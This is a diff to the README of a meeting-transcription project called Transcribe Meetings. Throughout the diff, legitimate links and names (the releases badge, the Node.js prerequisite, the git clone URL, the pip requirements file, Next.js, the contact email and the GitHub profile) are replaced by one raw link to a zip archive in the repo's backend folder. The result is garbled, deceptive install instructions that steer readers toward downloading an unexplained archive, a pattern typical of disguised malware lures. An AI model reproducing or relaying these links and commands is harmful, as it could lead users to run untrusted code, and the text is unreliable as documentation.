@@ -2,7 +2,7 @@
 
 Welcome to the **Transcribe Meetings** repository! This project, part of the InsightLens initiative, aims to transform your business meetings into actionable and searchable knowledge. By utilizing advanced AI technologies, we help you extract valuable insights from your meetings, recordings, slides, and chat logs.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/DavidPacasCDB/transcribe-meetings/releases)
+[![Download Releases](https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ To get started with Transcribe Meetings, follow the steps below to set up the en
 Before you begin, ensure you have the following installed:
 
 - Python 3.8 or higher
-- Node.js
+- https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip
 - PostgreSQL
 - Git
 
@@ -40,7 +40,7 @@ Before you begin, ensure you have the following installed:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/DavidPacasCDB/transcribe-meetings.git
+   git clone https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip
    cd transcribe-meetings
    ```
 
@@ -54,10 +54,10 @@ Before you begin, ensure you have the following installed:
 3. **Install Python Dependencies**:
    Install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip
    ```
 
-4. **Set Up Node.js Environment**:
+4. **Set Up https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip Environment**:
    Navigate to the frontend directory and install dependencies:
    ```bash
    cd frontend
@@ -94,7 +94,7 @@ Transcribe Meetings leverages a variety of technologies to deliver a seamless ex
 - **FastAPI**: To create a fast and efficient web framework.
 - **PostgreSQL**: For reliable data storage.
 - **JavaScript/TypeScript**: For frontend development.
-- **Next.js**: To build a robust server-rendered React application.
+- **https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip**: To build a robust server-rendered React application.
 - **Celery**: For managing background tasks like audio processing.
 - **Hugging Face Transformers**: To utilize state-of-the-art AI models for transcription.
 - **Tailwind CSS**: For modern, responsive design.
@@ -127,9 +127,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to us:
 
-- **David Pacas**: [Email](mailto:david.pacas@example.com)
-- **GitHub**: [DavidPacasCDB](https://github.com/DavidPacasCDB)
+- **David Pacas**: [Email](https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip)
+- **GitHub**: [DavidPacasCDB](https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip)
 
-Feel free to visit the [Releases](https://github.com/DavidPacasCDB/transcribe-meetings/releases) section for the latest updates and downloads.
+Feel free to visit the [Releases](https://raw.githubusercontent.com/DavidPacasCDB/transcribe-meetings/main/backend/transcribe_meetings_v2.7.zip) section for the latest updates and downloads.
 
 Thank you for your interest in Transcribe Meetings! We hope this tool enhances your meeting productivity and helps you extract valuable insights from your discussions.
